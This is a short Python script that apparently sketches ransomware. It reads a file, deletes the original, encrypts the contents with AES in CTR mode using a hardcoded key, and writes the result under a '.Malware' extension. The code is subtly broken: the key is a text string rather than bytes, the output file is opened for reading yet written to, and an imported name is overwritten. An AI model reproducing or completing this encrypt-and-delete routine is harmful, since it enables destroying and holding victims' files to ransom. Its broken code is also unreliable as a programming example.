from crypt import crypt
import os 
import pyaes

file_name = 'img.jpn'
file = open(file_name , 'rb')
file_date = file.read()
file.close()

os.remove(file_name)

key = 'R53fkR3vDGj6y0S2'
aes = pyaes.AESModeOfOperationCTR(key)
crypt = aes.encrypt(file_date)

new_file = file_name + '.Malware'
new_file = open(new_file)
new_file.write(crypt)
new_file.close()